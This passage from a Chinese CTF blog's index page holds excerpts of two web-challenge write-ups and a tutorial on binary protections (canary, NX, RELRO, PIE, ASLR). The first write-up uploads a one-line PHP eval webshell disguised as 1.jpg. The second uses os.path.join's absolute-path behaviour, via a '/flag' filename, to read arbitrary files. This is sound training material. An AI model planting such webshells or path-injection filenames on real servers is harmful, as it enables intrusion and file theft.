<p>相当于设定规则，把1.jpg当作php代码解析</p>
<ul>
<li><p>上传1.jpg</p>
<p>内容为一句话木马：<code>&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;</code></p>
</li>
<li><p>访问 <code>/upload/1.jpg</code>   POST cmd&#x3D;phpinfo();  搜索flag即可看到</p>
</li>
</ul>

	
	</div>
  <a type="button" href="/2023/07/17/SWPUCTF2022-easyupload3-wp/#more" class="btn btn-default more">Read More</a>
</div>

		
			
					
						<!-- display as entry -->
						<div class="row">
							<div class="col-md-8">
								<h3 class="title">
									<a href="/2023/07/17/NISACTF2022-babyupload-wp/" >NISACTF2022-babyupload-wp</a>
								</h3>
							</div>
							<div class="col-md-4">
								<div class="date">post @ 2023-07-17
								</div>
							</div>
						</div>
						
								
			<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2025">题目链接</a></p>
<h2 id="查看源码"><a href="#查看源码" class="headerlink" title="查看源码"></a>查看源码</h2><p>发现 <code>&lt;!-- /source --&gt;</code></p>
<p>访问下载得到python源代码</p>
<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, redirect, g, send_from_directory</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">SCHEMA = <span class="string">&quot;&quot;&quot;CREATE TABLE files (</span></span><br><span class="line"><span class="string">id text primary key,</span></span><br><span class="line"><span class="string">path text</span></span><br><span class="line"><span class="string">);</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db</span>():</span><br><span class="line">    g_db = <span class="built_in">getattr</span>(g, <span class="string">&#x27;_database&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> g_db <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        g_db = g._database = sqlite3.connect(<span class="string">&quot;database.db&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> g_db</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.before_first_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setup</span>():</span><br><span class="line">    os.remove(<span class="string">&quot;database.db&quot;</span>)</span><br><span class="line">    cur = db().cursor()</span><br><span class="line">    cur.executescript(SCHEMA)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;&quot;&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">&lt;form action=&quot;/upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span></span><br><span class="line"><span class="string">    Select image to upload:</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;submit&quot; value=&quot;Upload File&quot; name=&quot;submit&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;!-- /source --&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/source&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source</span>():</span><br><span class="line">    <span class="keyword">return</span> send_from_directory(directory=<span class="string">&quot;/var/www/html/&quot;</span>, path=<span class="string">&quot;www.zip&quot;</span>, as_attachment=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;.&quot;</span> <span class="keyword">in</span> file.filename:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Bad filename!&quot;</span>, <span class="number">403</span></span><br><span class="line">    conn = db()</span><br><span class="line">    cur = conn.cursor()</span><br><span class="line">    uid = uuid.uuid4().<span class="built_in">hex</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cur.execute(<span class="string">&quot;insert into files (id, path) values (?, ?)&quot;</span>, (uid, file.filename,))</span><br><span class="line">    <span class="keyword">except</span> sqlite3.IntegrityError:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Duplicate file&quot;</span></span><br><span class="line">    conn.commit()</span><br><span class="line"></span><br><span class="line">    file.save(<span class="string">&#x27;uploads/&#x27;</span> + file.filename)</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&#x27;/file/&#x27;</span> + uid)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/file/&lt;id&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">file</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    conn = db()</span><br><span class="line">    cur = conn.cursor()</span><br><span class="line">    cur.execute(<span class="string">&quot;select path from files where id=?&quot;</span>, (<span class="built_in">id</span>,))</span><br><span class="line">    res = cur.fetchone()</span><br><span class="line">    <span class="keyword">if</span> res <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;File not found&quot;</span>, <span class="number">404</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(res[0])</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(os.path.join(<span class="string">&quot;uploads/&quot;</span>, res[<span class="number">0</span>]), <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>

<p>代码逻辑：</p>
<ol>
<li>上传的文件名如果包含 “.”，则报错</li>
<li>上传成功的文件会存入<code>uploads</code> 文件夹中并生成一个uuid在<code>file</code>路径下</li>
<li>访问<code>file/&lt;id&gt;</code> 时找到对应文件名，然后拼接成 <code>uploads/filename</code> ，读取文件内容</li>
</ol>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><code>os.path.join()</code> 函数存在<strong>绝对路径拼接漏洞</strong></p>
<blockquote>
<pre><code>os.path.join(path,*paths)函数用于将多个文件路径连接成一个组合的路径。第一个函数通常包含了基础路径，而之后的每个参数被当作组件拼接到基础路径之后。

然而，这个函数有一个少有人知的特性，如果拼接的某个路径以 / 开头，那么包括基础路径在内的所有前缀路径都将被删除，该路径将视为绝对路径
</code></pre>
</blockquote>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>上传任意文件  然后抓包将文件名改为 “&#x2F;flag”，进行路径拼接时<code>uploads/</code>被删去，只剩下”&#x2F;flag”；跳转到 <code>&quot;/file/&lt;uuid&gt;&quot; </code> 即可查看flag</p>

	
	</div>
  <a type="button" href="/2023/07/17/NISACTF2022-babyupload-wp/#more" class="btn btn-default more">Read More</a>
</div>

		
			
					
						<!-- display as entry -->
						<div class="row">
							<div class="col-md-8">
								<h3 class="title">
									<a href="/2023/07/17/binary-protection/" >checksec与二进制程序保护机制（含PIE和ASLR比较）</a>
								</h3>
							</div>
							<div class="col-md-4">
								<div class="date">post @ 2023-07-17
								</div>
							</div>
						</div>
						
								
			<div class="entry">
  <div class="row">
	
	
		<h2 id="二进制程序各保护机制"><a href="#二进制程序各保护机制" class="headerlink" title="二进制程序各保护机制"></a>二进制程序各保护机制</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">checksec bin </span><br><span class="line">[*] &#x27;/usr/ctf/pwn/tests/bin&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<h3 id="CANARY"><a href="#CANARY" class="headerlink" title="CANARY"></a>CANARY</h3><blockquote>
<p>栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。</p>
</blockquote>
<p>编译时可以控制栈保护程度</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector -o <span class="built_in">test</span> test.c  //禁用栈保护</span><br><span class="line">gcc -fstack-protector -o <span class="built_in">test</span> test.c   //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码</span><br><span class="line">gcc -fstack-protector-all -o <span class="built_in">test</span> test.c //启用堆栈保护，为所有函数插入保护代码</span><br></pre></td></tr></table></figure>

<h3 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h3><blockquote>
<p>NX即No-eXecute（不可执行）的意思，NX的基本原理是将<strong>数据所在内存页标识为不可执行</strong>，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</p>
</blockquote>
<p>总的说就是开了栈上就不可执行代码，没开就可以</p>
<p>gcc编译器默认开启NX，关闭选项：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc test.c -z execstack -o <span class="built_in">test</span> </span><br></pre></td></tr></table></figure>

<h3 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h3><blockquote>
<p>设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。RELRO为” Partial RELRO”，说明我们对GOT表具有写权限。</p>
</blockquote>
<p>Partial RELRO 可以写GOT表；FULL RELRO写不了</p>
<h3 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h3><blockquote>
<p>PIE（Position Independent Executables）是编译器（gcc，..）功能选项（-fPIE），作用于excutable编译过程，可将其理解为特殊的PIC（so专用，Position Independent Code），加了PIE选项编译出来的ELF用file命令查看会显示其为so，其随机化了ELF装载内存的基址（代码段、plt、got、data等共同的基址）</p>
</blockquote>
<h3 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h3><blockquote>
<p>首先ASLR是归属于系统功能的， 是一种针对缓冲区溢出的安全保护技术，通过对堆、栈、共享库映射等线性区布局的随机化，通过增加攻击者预测目的地址的难度，防止攻击者直接定位攻击代码位置，达到阻止溢出攻击的目的的一种技术。</p>
</blockquote>
<p>有三种模式  存储于 <code>/proc/sys/kernel/randomize_va_space</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0 - 表示关闭进程地址空间随机化。</span><br><span class="line">1 - 表示将mmap的基址，stack和vdso页面随机化。</span><br><span class="line">2 - 表示在1的基础上增加栈（heap）的随机化。</span><br></pre></td></tr></table></figure>

<p>PWN的话题目环境一般都是开 2</p>
<h3 id="PIE和ASLR异同"><a href="#PIE和ASLR异同" class="headerlink" title="PIE和ASLR异同"></a>PIE和ASLR异同</h3><p>单看比较生硬，看下面的vmmap比较会更清晰，建议读者执行程序对比分析</p>
<ul>
<li>PIE是编译器功能选项，作用于excutable编译过程，随机化了ELF装载内存的基址（代码段、plt、got、data等共同的基址）</li>
<li>ASLR的是操作系统的功能选项，作用于executable（ELF）装入内存运行时，只能随机化stack、heap、libraries（.so）的基址，不负责代码段、plt、got、data基地址的随机化</li>
<li>ASLR早于PIE出现</li>
<li>CTF中PWN题基本都会开ASLR&#x3D;2</li>
</ul>
<p>gcc编译默认开启PIE，关闭选项：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc test.c -o bin_pie</span><br><span class="line">gcc test.c -no-pie -o bin_no_pie</span><br></pre></td></tr></table></figure>

<p>gef 调试时默认关闭ASLR，启动方式：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gef➤  aslr on</span><br><span class="line">[+] Enabling ASLR</span><br><span class="line">gef➤  start	<span class="comment"># 注意aslr开启一定要在start之前</span></span><br></pre></td></tr></table></figure>

<h4 id="pie-off-aslr-off"><a href="#pie-off-aslr-off" class="headerlink" title="pie off, aslr off"></a>pie off, aslr off</h4><p>每次执行后 所有地址区间都是固定的</p>
<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/07/17/binary-protection/0x1.png?raw=true" alt="img"></p>
<h4 id="pie-off-aslr-on"><a href="#pie-off-aslr-on" class="headerlink" title="pie off, aslr on"></a>pie off, aslr on</h4><ul>
<li>可以看到红色部分代码程序段与ASLR关闭时相同，说明ASLR不负责这部分地址随机化</li>
<li>蓝色部分每次执行都是随机的，即 堆、栈、libc段等</li>
</ul>
<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/07/17/binary-protection/0x2.png?raw=true" alt="img"></p>
<h4 id="pie-on-aslr-off"><a href="#pie-on-aslr-off" class="headerlink" title="pie on, aslr off"></a>pie on, aslr off</h4><ul>
<li>与 <code>pie off, aslr off</code> 的差别仅在于红色部分代码程序段，相当于都加了一个偏移量</li>
<li>但是每次执行后  所有地址区间也都是固定的</li>
</ul>
<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/07/17/binary-protection/0x3.png?raw=true" alt="img"></p>
<h4 id="pie-on-aslr-on"><a href="#pie-on-aslr-on" class="headerlink" title="pie on, aslr on"></a>pie on, aslr on</h4><p>这时候相当于所有地址区域每次执行后  蓝色区域都是随机的</p>
<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/07/17/binary-protection/0x4.png?raw=true" alt="img"></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ol>
<li>PIE相当于能力赋予，而ASLR才是真正使用</li>
<li>在CTF中，PIE主要影响程序（不包含libc）的地址，影响跳转目标执行地址的确定；ASLR主要影响 libc, stack 和 heap 的地址确定</li>
<li>注意即便地址是随机的，但同一地址区域内的内容的偏移量都是固定的</li>
<li>PIE开启后，IDA中看到的代码地址不能直接使用，要加上一个base（通常需泄露）</li>
</ol>
<h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p>开了PIE和ASLR时每次地址都会变，那么如何下断点呢？</p>
<p>如果有符号表的话当然可以直接使用 <code>b func_name</code> ，但如果没有符号表，在gef中可以使用 <code>pie b offset</code> ，gef会自动帮我们计算出正确的地址，如下图</p>
<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/07/17/binary-protection/0x5.png?raw=true" alt="img"></p>

	
	</div>
  <a type="button" href="/2023/07/17/binary-protection/#more" class="btn btn-default more">Read More</a>
</div>

		

		</div>

		<!-- pagination -->
		<div>
  		<center>
		<div class="pagination">

   
    
     <a href="/page/6/" type="button" class="btn btn-default"><i class="fa fa-arrow-circle-o-left"></i> Prev</a>
      

        <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
 
       <a href="/page/8/" type="button" class="btn btn-default ">Next<i class="fa fa-arrow-circle-o-right"></i></a>     
        

  
</div>

  		</center>
		</div>

		
		
	</div> <!-- col-md-9 -->

	
		<div class="col-md-3">
	<div id="sidebar">
	
			
  <div id="site_search">
   <div class="form-group">
    <input type="text" id="local-search-input" name="q" results="0" placeholder="Search" class="st-search-input st-default-search-input form-control"/>
   </div>  
  <div id="local-search-result"></div>
  </div>


		
			
	<div class="widget">
		<h4>Categories</h4>
		<ul class="tag_box inline list-unstyled">
		
			<li><a href="/categories/CVE/">CVE<span>11</span></a></li>
		
			<li><a href="/categories/fuzz/">fuzz<span>2</span></a></li>
		
			<li><a href="/categories/pwn-learning/">pwn-learning<span>5</span></a></li>
		
			<li><a href="/categories/pwn-wp/">pwn-wp<span>22</span></a></li>
		
			<li><a href="/categories/reverse-learning/">reverse-learning<span>1</span></a></li>
		
			<li><a href="/categories/reverse-wp/">reverse-wp<span>6</span></a></li>
		
			<li><a href="/categories/web-learning/">web-learning<span>8</span></a></li>
		
			<li><a href="/categories/web-wp/">web-wp<span>54</span></a></li>
		
		</ul>
	</div>

		
			
	<div class="widget">
		<h4>Tag Cloud</h4>
		<ul class="tag_box inline list-unstyled">		
		
			<li><a href="/tags/zer0pts2020/">zer0pts2020<span>1</span></a></li>
		
			<li><a href="/tags/无字母rce/">无字母rce<span>3</span></a></li>
		
			<li><a href="/tags/nodejs/">nodejs<span>5</span></a></li>
		
			<li><a href="/tags/java/">java<span>6</span></a></li>
		
			<li><a href="/tags/ret2syscall/">ret2syscall<span>2</span></a></li>
		
			<li><a href="/tags/stack-overflow/">stack_overflow<span>1</span></a></li>
		
			<li><a href="/tags/pickle/">pickle<span>1</span></a></li>
		
			<li><a href="/tags/unserialize/">unserialize<span>16</span></a></li>
		
			<li><a href="/tags/libc/">libc<span>1</span></a></li>
		
			<li><a href="/tags/bypass/">bypass<span>5</span></a></li>
		
			<li><a href="/tags/scxml/">scxml<span>1</span></a></li>
		
			<li><a href="/tags/afr/">afr<span>2</span></a></li>
		
			<li><a href="/tags/pwn/">pwn<span>27</span></a></li>
		
			<li><a href="/tags/无字母命令执行/">无字母命令执行<span>1</span></a></li>
		
			<li><a href="/tags/vtable/">vtable<span>2</span></a></li>
		
			<li><a href="/tags/stack/">stack<span>10</span></a></li>
		
			<li><a href="/tags/Spring/">Spring<span>1</span></a></li>
		
			<li><a href="/tags/heap/">heap<span>4</span></a></li>
		
			<li><a href="/tags/De1ctf2019/">De1ctf2019<span>1</span></a></li>
		
			<li><a href="/tags/privilege-escalation/">privilege escalation<span>1</span></a></li>
		
		
		   <li><a href="/tags">...<span>126</span></a></li>
		 
		</ul>
	</div>


		
			
<div class="widget">
  <h4>Recent Posts</h4>
  <ul class="entry list-unstyled">
    
      <li>
        <a href="/2024/01/19/Spring4Shell漏洞/" ><i class="fa fa-file-o"></i>Spring4Shell漏洞(CVE-2022-229...</a>
      </li>
    
      <li>
        <a href="/2024/01/16/JNDI注入/" ><i class="fa fa-file-o"></i>JNDI注入</a>
      </li>
    
      <li>
        <a href="/2024/01/11/HTB-bizness-wp/" ><i class="fa fa-file-o"></i>HTB-bizness-wp</a>
      </li>
    
      <li>
        <a href="/2024/01/10/node反序列化RCE/" ><i class="fa fa-file-o"></i>node反序列化RCE(CVE-2017-5941)</a>
      </li>
    
      <li>
        <a href="/2024/01/04/HNCTF2023-BabyJxVx-wp/" ><i class="fa fa-file-o"></i>HNCTF2023-BabyJxVx-wp</a>
      </li>
    
  </ul>
</div>

		
	</div> <!-- sidebar -->
</div> <!-- col-md-3 -->

	
	
</div> <!-- row-fluid -->
	</div>
  </div>
  <div class="container-narrow">
  <footer>  </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



</body>
   </html>
